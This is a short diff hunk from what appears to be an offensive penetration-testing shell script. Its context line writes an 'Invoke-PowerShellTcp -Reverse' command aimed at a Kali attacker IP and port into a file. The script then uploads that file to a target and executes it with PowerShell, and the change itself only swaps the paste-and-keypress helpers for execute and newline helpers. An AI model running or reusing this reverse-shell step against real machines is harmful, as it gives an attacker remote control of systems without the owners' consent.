@@ -15,5 +15,5 @@ echo "Invoke-PowerShellTcp -Reverse -IPAddress ${KALI_IP} -Port ${SHELL_PORT}" >
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-paste_command "powershell -c '${FILE_LOCATION}'"
-xdotool key Return
+execute_command "powershell -c '${FILE_LOCATION}'"
+create_new_line
